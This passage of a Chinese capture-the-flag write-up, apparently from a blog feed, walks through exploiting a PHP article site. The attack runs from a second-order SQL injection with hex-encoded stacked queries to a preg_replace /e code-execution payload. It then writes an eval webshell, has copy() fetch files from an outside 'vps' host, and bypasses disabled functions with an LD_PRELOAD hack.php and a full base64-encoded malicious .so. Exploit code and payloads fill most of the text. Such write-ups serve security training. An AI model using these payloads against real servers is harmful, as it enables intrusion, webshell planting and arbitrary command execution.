function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"update article set title='$title',content='$content' where title='"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('Edited successfully.');location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('You do not have permission.');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在edit.php，<code>$row[&#39;title&#39;]</code>的来源是数据库。在writing.php 插入的时候，使用<code>addslashes</code>转义了<code>title</code>的内容但是在上面未经任何处理又直接取出来会导致二次注入，例如第一次插入<code>&#39;1</code>，经过<code>addlashes</code>转义，sql 语句变成</p><pre class=" language-php"><code class="language-php">insert into <span class="token function">article</span> <span class="token punctuation">(</span>userid<span class="token punctuation">,</span>title<span class="token punctuation">,</span>content<span class="token punctuation">)</span> <span class="token function">values</span> <span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">'\'1'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>"</code></pre><p>但是插入数据库的内容是<code>&#39;1</code>，取出来的时候也是<code>&#39;1</code>，这就导致了注入。</p><p>所以我们可以利用这个点进行注入，update 我们的 isvip 字段就行</p><pre><code>&#39;;update users set isvip=1 where username=&#39;hh&#39;;</code></pre><p>在config.php中的SafeFilter函数，可以通过堆叠绕过</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">"update users set isvip=1 where username='hh';"</span><span class="token keyword">print</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d276868273b</span></code></pre><pre><code>&#39;;set @t=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d276868273b;prepare x from @t;execute x;</code></pre><p>在writing中把payload写进title里，再edit中提交一次就可以触发注入</p><p>成为vip后进入replace.php页面</p><pre><code>$content = addslashes(preg_replace(&quot;/&quot; . $_POST[&#39;find&#39;] . &quot;/&quot;, $_POST[&#39;replace&#39;], $row[&#39;content&#39;]));</code></pre><p>在PHP5.5以下的版本中，/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</p><p>/e再加%00截断后面多余的字符</p><pre class=" language-php"><code class="language-php">find<span class="token operator">=</span><span class="token operator">/</span>e<span class="token operator">%</span><span class="token number">00</span><span class="token operator">&amp;</span>replace<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>regex<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">//看一下disable function</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>ini_set<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_get_handler<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>pcntl_async_signals<span class="token punctuation">,</span>system<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>link<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>mail    </code></pre><p>可以写文件</p><pre><code>//写webshell.phpfind=/e%00&amp;replace=file_put_contents(&#39;/var/www/html/webshell.php&#39;,&#39;&lt;?php eval($_POST[a]);&#39;);&amp;regex=1&amp;id=2//用webshell写其他文件copy(&quot;http://vps/1.txt&quot;, &quot;/var/www/html/webshell.php&quot;);echo copy(&quot;http://vps/hack.so&quot;,&quot;hack.so&quot;);</code></pre><p>有basedir的限制，通过opendir和readdir列目录，读到了flag和readflag，需要命令执行</p><pre><code>//在webshell执行命令if ($dh = opendir(&quot;glob:///*&quot;)) {    while (($file = readdir($dh)) !== false) {        echo &quot;$file\n&quot;;    }    closedir($dh);}</code></pre><p>利用webshell.php 执行以下命令 写 hack.php 和 hack.so</p><pre class=" language-php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/hack.php'</span><span class="token punctuation">,</span><span class="token string">'&lt;?php putenv("LD_PRELOAD=./hack.so"); putenv("_evilcmd=".$_REQUEST["a"]." >/tmp/res"); if (function_exists("error_log")){error_log("", 1, "example@example.com");echo "error_log";} elseif (function_exists("mail")){ mail("", "", "", "");echo "mail";} elseif (function_exists("mb_send_mail")){mb_send_mail("","",""); echo "mb_send_mail";  } elseif ((function_exists("imap_mail"))){ imap_mail("","",""); echo "imap_mail"; } else { echo "fail";  } echo "  ".file_get_contents("/tmp/res");?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-PHP"><code class="language-PHP">file_put_contents%28%22%2Fvar%2Fwww%2Fhtml%2Fhack.so%22%2Cbase64_decode%28%22f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgAYAAAAAAABAAAAAAAAAAAgZAAAAAAAAAAAAAEAAOAAHAEAAHQAaAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnAgAAAAAAACcCAAAAAAAAAAAIAAAAAAAAQAAAAYAAAAADgAAAAAAAAAOIAAAAAAAAA4gAAAAAABAAgAAAAAAAEgCAAAAAAAAAAAgAAAAAAACAAAABgAAABgOAAAAAAAAGA4gAAAAAAAYDiAAAAAAAMABAAAAAAAAwAEAAAAAAAAIAAAAAAAAAAQAAAAEAAAAyAEAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAAUOV0ZAQAAADwBwAAAAAAAPAHAAAAAAAA8AcAAAAAAAAkAAAAAAAAACQAAAAAAAAABAAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQEAAAAAA4AAAAAAAAADiAAAAAAAAAOIAAAAAAAAAIAAAAAAAAAAgAAAAAAAAEAAAAAAAAABAAAABQAAAADAAAAR05VABV%2FzjY58tz%2Flyy0JwI35hHfs%2BOoAAAAAAMAAAAKAAAAAQAAAAYAAACIyCABgBRACQoAAAAMAAAADgAAAEJF1ey745J82HFYHLmN8Q7q0%2B8O7JJz8M9JSZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAJAPgFAAAAAAAAAAAAAAAAAAB9AAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAIAAAAAAAAAAAAAAAAAAAAAAAAACEAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIAAAAAAAAAAAAAAAAAAAAAAAAABhAAAAIAAAAAAAAAAAAAAAAAAAAAAAAACTAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAIAAAAAAAAAAAAAAAAAAAAAAAAABSAAAAIgAAAAAAAAAAAAAAAAAAAAAAAACmAAAAEAAXAEAQIAAAAAAAAAAAAAAAAAC5AAAAEAAYAEgQIAAAAAAAAAAAAAAAAACtAAAAEAAYAEAQIAAAAAAAAAAAAAAAAAAQAAAAEgAJAPgFAAAAAAAAAAAAAAAAAAAWAAAAEgANANAHAAAAAAAAAAAAAAAAAACLAAAAEgAMAJsHAAAAAAAANAAAAAAAAAB1AAAAEgAMAIAHAAAAAAAAGwAAAAAAAAAAX19nbW9uX3N0YXJ0X18AX2luaXQAX2ZpbmkAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemUAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBwYXlsb2FkAGdldGVudgBzeXN0ZW0AZ2V0ZXVpZAB1bnNldGVudgBsaWJjLnNvLjYAX2VkYXRhAF9fYnNzX3N0YXJ0AF9lbmQAR0xJQkNfMi4yLjUAAAAAAAIAAAACAAAAAAACAAAAAgABAAEAAQABAAEAAQABAAAAAAABAAEAnAAAABAAAAAAAAAAdRppCQAAAgC%2BAAAAAAAAAAAOIAAAAAAACAAAAAAAAABQBwAAAAAAAAgOIAAAAAAACAAAAAAAAAAQBwAAAAAAADgQIAAAAAAACAAAAAAAAAA4ECAAAAAAANgPIAAAAAAABgAAAAMAAAAAAAAAAAAAAOAPIAAAAAAABgAAAAUAAAAAAAAAAAAAAOgPIAAAAAAABgAAAAYAAAAAAAAAAAAAAPAPIAAAAAAABgAAAAgAAAAAAAAAAAAAAPgPIAAAAAAABgAAAAkAAAAAAAAAAAAAABgQIAAAAAAABwAAAAIAAAAAAAAAAAAAACAQIAAAAAAABwAAAAQAAAAAAAAAAAAAACgQIAAAAAAABwAAABAAAAAAAAAAAAAAADAQIAAAAAAABwAAAAcAAAAAAAAAAAAAAEiD7AhIiwXdCSAASIXAdAXoYwAAAEiDxAjDAAAAAAAAAAAAAAAAAAD%2FNeIJIAD%2FJeQJIAAPH0AA%2FyXiCSAAaAAAAADp4P%2F%2F%2F%2F8l2gkgAGgBAAAA6dD%2F%2F%2F%2F%2FJdIJIABoAgAAAOnA%2F%2F%2F%2F%2FyXKCSAAaAMAAADpsP%2F%2F%2F%2F8lagkgAGaQ%2FyV6CSAAZpBIjT25CSAASI0FuQkgAFVIKfhIieVIg%2FgOdhVIiwU2CSAASIXAdAld%2F%2BBmDx9EAABdww8fQABmLg8fhAAAAAAASI09eQkgAEiNNXIJIABVSCn%2BSInlSMH%2BA0iJ8EjB6D9IAcZI0f50GEiLBQEJIABIhcB0DF3%2F4GYPH4QAAAAAAF3DDx9AAGYuDx%2BEAAAAAACAPSkJIAAAdSdIgz3XCCAAAFVIieV0DEiLPQoJIADoRf%2F%2F%2F%2BhI%2F%2F%2F%2FXcYFAAkgAAHzww8fQABmLg8fhAAAAAAASI09uQYgAEiDPwB1C%2Ble%2F%2F%2F%2FZg8fRAAASIsFeQggAEiFwHTpVUiJ5f%2FQXelA%2F%2F%2F%2FVUiJ5UiNPU4AAADooP7%2F%2F0iJx%2Bio%2Fv%2F%2FkF3DVUiJ5UiNPTwAAADohf7%2F%2F0iFwHUHuAAAAADrFkiNPSQAAADonf7%2F%2F7gAAAAA6IP%2B%2F%2F9dwwBIg%2BwISIPECMNfZXZpbGNtZABMRF9QUkVMT0FEAAAAAAEbAzskAAAAAwAAADD%2B%2F%2F9AAAAAkP%2F%2F%2F2gAAACr%2F%2F%2F%2FiAAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAOj9%2F%2F9QAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAHAAAAEQAAAAg%2F%2F%2F%2FGwAAAABBDhCGAkMNBlYMBwgAAAAcAAAAZAAAABv%2F%2F%2F80AAAAAEEOEIYCQw0GbwwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQBwAAAAAAABAHAAAAAAAAAAAAAAAAAAABAAAAAAAAAJwAAAAAAAAADAAAAAAAAAD4BQAAAAAAAA0AAAAAAAAA0AcAAAAAAAAZAAAAAAAAAAAOIAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7%2FbwAAAADwAQAAAAAAAAUAAAAAAAAAyAMAAAAAAAAGAAAAAAAAADACAAAAAAAACgAAAAAAAADKAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAABgAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAJgFAAAAAAAABwAAAAAAAADYBAAAAAAAAAgAAAAAAAAAwAAAAAAAAAAJAAAAAAAAABgAAAAAAAAA%2Fv%2F%2FbwAAAAC4BAAAAAAAAP%2F%2F%2F28AAAAAAQAAAAAAAADw%2F%2F9vAAAAAJIEAAAAAAAA%2Bf%2F%2FbwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAADYGAAAAAAAARgYAAAAAAABWBgAAAAAAAGYGAAAAAAAAOBAgAAAAAABHQ0M6IChVYnVudHUgNS40LjAtNnVidW50dTF%2BMTYuMDQuMTEpIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAEAyAEAAAAAAAAAAAAAAAAAAAAAAAADAAIA8AEAAAAAAAAAAAAAAAAAAAAAAAADAAMAMAIAAAAAAAAAAAAAAAAAAAAAAAADAAQAyAMAAAAAAAAAAAAAAAAAAAAAAAADAAUAkgQAAAAAAAAAAAAAAAAAAAAAAAADAAYAuAQAAAAAAAAAAAAAAAAAAAAAAAADAAcA2AQAAAAAAAAAAAAAAAAAAAAAAAADAAgAmAUAAAAAAAAAAAAAAAAAAAAAAAADAAkA%2BAUAAAAAAAAAAAAAAAAAAAAAAAADAAoAIAYAAAAAAAAAAAAAAAAAAAAAAAADAAsAcAYAAAAAAAAAAAAAAAAAAAAAAAADAAwAgAYAAAAAAAAAAAAAAAAAAAAAAAADAA0A0AcAAAAAAAAAAAAAAAAAAAAAAAADAA4A2QcAAAAAAAAAAAAAAAAAAAAAAAADAA8A8AcAAAAAAAAAAAAAAAAAAAAAAAADABAAGAgAAAAAAAAAAAAAAAAAAAAAAAADABEAAA4gAAAAAAAAAAAAAAAAAAAAAAADABIACA4gAAAAAAAAAAAAAAAAAAAAAAADABMAEA4gAAAAAAAAAAAAAAAAAAAAAAADABQAGA4gAAAAAAAAAAAAAAAAAAAAAAADABUA2A8gAAAAAAAAAAAAAAAAAAAAAAADABYAABAgAAAAAAAAAAAAAAAAAAAAAAADABcAOBAgAAAAAAAAAAAAAAAAAAAAAAADABgAQBAgAAAAAAAAAAAAAAAAAAAAAAADABkAAAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH%2FAAAAAAAAAAAAAAAAAAAAAAwAAAABABMAEA4gAAAAAAAAAAAAAAAAABkAAAACAAwAgAYAAAAAAAAAAAAAAAAAABsAAAACAAwAwAYAAAAAAAAAAAAAAAAAAC4AAAACAAwAEAcAAAAAAAAAAAAAAAAAAEQAAAABABgAQBAgAAAAAAABAAAAAAAAAFMAAAABABIACA4gAAAAAAAAAAAAAAAAAHoAAAACAAwAUAcAAAAAAAAAAAAAAAAAAIYAAAABABEAAA4gAAAAAAAAAAAAAAAAAKUAAAAEAPH%2FAAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH%2FAAAAAAAAAAAAAAAAAAAAAKwAAAABABAAmAgAAAAAAAAAAAAAAAAAALoAAAABABMAEA4gAAAAAAAAAAAAAAAAAAAAAAAEAPH%2FAAAAAAAAAAAAAAAAAAAAAMYAAAABABcAOBAgAAAAAAAAAAAAAAAAANMAAAABABQAGA4gAAAAAAAAAAAAAAAAANwAAAAAAA8A8AcAAAAAAAAAAAAAAAAAAO8AAAABABcAQBAgAAAAAAAAAAAAAAAAAPsAAAABABYAABAgAAAAAAAAAAAAAAAAABEBAAASAAAAAAAAAAAAAAAAAAAAAAAAACUBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEEBAAAQABcAQBAgAAAAAAAAAAAAAAAAAEgBAAASAA0A0AcAAAAAAAAAAAAAAAAAAE4BAAASAAAAAAAAAAAAAAAAAAAAAAAAAGIBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAHEBAAASAAwAmwcAAAAAAAA0AAAAAAAAAHkBAAASAAwAgAcAAAAAAAAbAAAAAAAAAIEBAAAQABgASBAgAAAAAAAAAAAAAAAAAIYBAAAQABgAQBAgAAAAAAAAAAAAAAAAAJIBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAKYBAAASAAAAAAAAAAAAAAAAAAAAAAAAALwBAAAgAAAAAAAAAAAAAAAAAAAAAAAAANYBAAAiAAAAAAAAAAAAAAAAAAAAAAAAAPIBAAASAAkA%2BAUAAAAAAAAAAAAAAAAAAABjcnRzdHVmZi5jAF9fSkNSX0xJU1RfXwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc1OTQAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGhhY2suYwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9fZHNvX2hhbmRsZQBfRFlOQU1JQwBfX0dOVV9FSF9GUkFNRV9IRFIAX19UTUNfRU5EX18AX0dMT0JBTF9PRkZTRVRfVEFCTEVfAGdldGVudkBAR0xJQkNfMi4yLjUAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9lZGF0YQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAGdldGV1aWQAcGF5bG9hZABfZW5kAF9fYnNzX3N0YXJ0AF9Kdl9SZWdpc3RlckNsYXNzZXMAdW5zZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmpjcgAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v%2F%2FbwIAAAAAAAAA8AEAAAAAAADwAQAAAAAAAEAAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAADACAAAAAAAAMAIAAAAAAACYAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADIAwAAAAAAAMgDAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA%2F%2F%2F%2FbwIAAAAAAAAAkgQAAAAAAACSBAAAAAAAACIAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7%2F%2F28CAAAAAAAAALgEAAAAAAAAuAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADYBAAAAAAAANgEAAAAAAAAwAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAmAUAAAAAAACYBQAAAAAAAGAAAAAAAAAAAwAAABYAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAAPgFAAAAAAAA%2BAUAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAgBgAAAAAAACAGAAAAAAAAUAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB%2BAAAAAQAAAAYAAAAAAAAAcAYAAAAAAABwBgAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAhwAAAAEAAAAGAAAAAAAAAIAGAAAAAAAAgAYAAAAAAABPAQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAAAADQBwAAAAAAANAHAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAAAAIAAAAAAAAA2QcAAAAAAADZBwAAAAAAABQAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAmwAAAAEAAAACAAAAAAAAAPAHAAAAAAAA8AcAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAAAYCAAAAAAAABgIAAAAAAAAhAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACzAAAADgAAAAMAAAAAAAAAAA4gAAAAAAAADgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAgOIAAAAAAACA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMsAAAABAAAAAwAAAAAAAAAQDiAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADQAAAABgAAAAMAAAAAAAAAGA4gAAAAAAAYDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAANgPIAAAAAAA2A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADiAAAAAQAAAAMAAAAAAAAAOBAgAAAAAAA4EAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA6AAAAAgAAAADAAAAAAAAAEAQIAAAAAAAQBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAO0AAAABAAAAMAAAAAAAAAAAAAAAAAAAAEAQAAAAAAAANQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAQGAAAAAAAAPYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAeBAAAAAAAACgBQAAAAAAABwAAAAtAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAABgWAAAAAAAA%2BAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA%3D%22%29%29%3B</code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> bypassDF </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crypto初级题目</title>
      <link href="/2019/08/30/crypto/xman-crypto/"/>
      <url>/2019/08/30/crypto/xman-crypto/</url>
      
